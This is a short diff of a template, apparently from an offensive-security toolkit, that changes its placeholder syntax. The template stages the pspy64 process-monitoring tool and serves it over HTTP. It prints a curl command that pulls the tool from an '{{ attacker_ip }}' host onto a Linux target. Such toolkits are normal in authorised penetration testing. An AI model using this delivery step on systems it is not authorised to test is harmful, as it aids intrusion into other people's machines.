@@ -6,9 +6,9 @@ metadata:
   author: "Unknown"
 
 content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/pspy/pspy64 packstation/outbound/; \
+  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/pspy/pspy64 packstation/outbound/; \
   echo '================================================================'; \
   echo '                       -----Linux------                         '; \
-  echo 'Deliver: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/pspy64 -o <%=$(esh variables/delivery_path_linux)%>/pspy64'; \
+  echo 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/pspy64 -o {{ delivery_path_linux }}/pspy64'; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
